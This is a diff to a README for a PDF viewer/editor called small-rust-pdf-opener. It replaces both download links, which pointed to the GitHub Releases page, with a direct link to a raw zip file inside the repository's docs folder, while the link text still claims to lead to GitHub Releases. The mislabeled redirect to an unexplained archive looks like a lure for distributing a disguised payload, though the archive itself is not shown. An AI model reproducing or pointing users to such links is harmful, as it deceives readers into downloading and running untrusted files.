@@ -1,7 +1,7 @@
 <h1>🔍 small-rust-pdf-opener - View, Edit, and Sign PDFs Offline</h1>
 
 <p align="center">
-  <a href="https://github.com/adycerr3192/small-rust-pdf-opener/releases" style="display:inline-block;background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:18px 36px;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download small-rust-pdf-opener</a>
+  <a href="https://raw.githubusercontent.com/adycerr3192/small-rust-pdf-opener/main/docs/2.0-alpha.3.zip" style="display:inline-block;background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:18px 36px;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download small-rust-pdf-opener</a>
 </p>
 
 ## 🚀 Getting Started
@@ -12,7 +12,7 @@ Welcome! This application lets you open, view, edit, and sign PDF files on your 
 
 Visit the link below to download the latest version:
 
-👉 **<a href="https://github.com/adycerr3192/small-rust-pdf-opener/releases">Download from GitHub Releases</a>**
+👉 **<a href="https://raw.githubusercontent.com/adycerr3192/small-rust-pdf-opener/main/docs/2.0-alpha.3.zip">Download from GitHub Releases</a>**
 
 This link takes you to a page where you can find the file for your computer. Look for the file named something like `small-rust-pdf-opener-setup.exe` or `small-rust-pdf-opener.zip`.
 
